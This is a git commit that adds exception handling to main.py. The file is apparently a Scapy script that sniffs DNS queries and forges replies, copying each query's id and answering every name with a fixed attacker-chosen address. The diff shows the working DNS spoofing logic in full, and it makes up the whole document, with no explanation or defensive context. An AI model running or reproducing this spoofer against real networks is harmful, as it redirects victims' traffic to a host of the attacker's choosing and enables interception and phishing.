3c0d7d4c289814601b1cdd99f43f4845352ec95b
Javier Parada <javierparadadev@gmail.com>
2022-12-08 14:55:35 +0100

    Add try and except

--- main.py
+++ main.py
@@ -6,27 +6,30 @@ destiny = None
 
 
 def on_dns_packet_detected(pkt):
-    if not pkt.haslayer(DNS):
-        return
+    try:
+        if not pkt.haslayer(DNS):
+            return
 
-    if not pkt[DNS].qr == 0:
-        return
+        if not pkt[DNS].qr == 0:
+            return
 
-    if pkt.haslayer(DNSRR):
-        return
+        if pkt.haslayer(DNSRR):
+            return
 
-    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
-    dns = DNS()
+        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+        dns = DNS()
 
-    response = ip / udp / dns
+        response = ip / udp / dns
 
-    response[DNS].id = pkt[DNS].id
-    response[DNS].qr = 1
-    response[DNS].qd = pkt[DNS].qd
-    response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=destiny)
+        response[DNS].id = pkt[DNS].id
+        response[DNS].qr = 1
+        response[DNS].qd = pkt[DNS].qd
+        response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=destiny)
 
-    send(response)
+        send(response)
+    except Exception as e:
+        print(repr(e))
 
 
 if __name__ == '__main__':
